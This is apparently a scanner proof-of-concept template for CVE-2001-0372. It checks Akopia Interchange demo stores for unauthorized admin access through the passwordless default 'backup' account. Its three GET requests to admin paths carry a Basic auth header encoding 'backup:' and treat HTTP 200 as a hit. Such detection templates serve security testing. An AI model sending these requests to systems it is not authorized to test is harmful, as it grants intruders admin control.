[info]
author = "ave"
description = "验证 Akopia Interchange 演示商店是否由于默认组账户 :backup 无密码而允许未经授权的管理访问"
id = "POC-AVE-2001-1520"
name = "Akopia Interchange Default Account PoC"
severity = "critical"
tags = ["ave-2001-1520"]
vuln_id = [
    "CVE-2001-0372",
    "AVE-2001-1520",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/barry/admin"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic YmFja3VwOg=="

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/basic/admin"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic YmFja3VwOg=="

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/construct/admin"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic YmFja3VwOg=="

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
